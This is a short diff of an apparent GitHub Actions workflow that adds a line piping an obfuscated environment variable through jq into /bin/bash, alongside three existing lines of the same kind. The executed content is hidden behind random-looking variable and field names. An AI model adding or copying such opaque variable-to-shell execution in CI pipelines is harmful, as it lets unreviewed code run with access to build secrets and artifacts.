@@ -35,6 +35,7 @@ jobs:
           echo $nqmdw1 | jq -r .xz771 | /bin/bash
           echo $qxnf497 | jq -r .b70413 | /bin/bash
           echo $juyo844 | jq -r .g1978 | /bin/bash
+          printf '%s' "$jpru0052" | jq -r .z4 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
